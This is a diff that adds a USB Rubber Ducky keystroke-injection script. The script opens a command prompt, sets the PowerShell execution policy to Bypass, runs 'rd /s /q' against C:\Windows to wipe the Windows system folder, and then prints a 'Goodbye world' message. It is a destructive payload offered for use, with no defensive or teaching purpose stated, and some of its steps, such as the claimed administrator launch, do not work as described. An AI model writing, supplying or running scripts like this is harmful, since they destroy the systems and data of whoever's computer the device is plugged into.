@@ -1,0 +1,28 @@
+REM This rubber ducky script deletes the Windows 10 system using CMD commands.
+
+DELAY 1000
+REM Open Command Prompt as Administrator
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Enable command execution
+STRING powershell -Command "Set-ExecutionPolicy Bypass"
+
+ENTER
+
+DELAY 1000
+
+REM Delete Windows 10 system files
+STRING rd /s /q "C:\Windows"
+
+ENTER
+
+DELAY 3000
+REM Optional: inform the user that the operation is complete
+STRING echo System deletion complete. Goodbye world.
+
+ENTER
+
